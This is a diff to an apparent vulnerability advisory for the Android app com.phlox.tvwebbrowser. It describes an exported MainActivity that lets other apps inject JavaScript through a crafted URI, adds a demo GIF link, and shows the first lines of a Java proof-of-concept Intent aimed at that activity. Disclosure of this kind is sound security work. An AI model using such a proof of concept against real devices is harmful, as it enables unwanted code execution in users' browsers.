@@ -17,6 +17,9 @@ The `com.phlox.tvwebbrowser` application improperly handles external intents, po
 The exposed `com.phlox.tvwebbrowser.activity.main.MainActivity` allows external applications to execute arbitrary JavaScript within its context. Specifically, a malicious app can invoke this activity with a specially crafted URI that contains JavaScript, leading to unwanted code execution.
 
 ##### Proof of Concept:
+
+![image](https://github.com/actuator/com.phlox.tvwebbrowser/blob/main/tvwebpoc.gif)
+
 ```java
 Intent intent = new Intent(Intent.ACTION_VIEW);
 intent.setComponent(new ComponentName("com.phlox.tvwebbrowser", "com.phlox.tvwebbrowser.activity.main.MainActivity"));
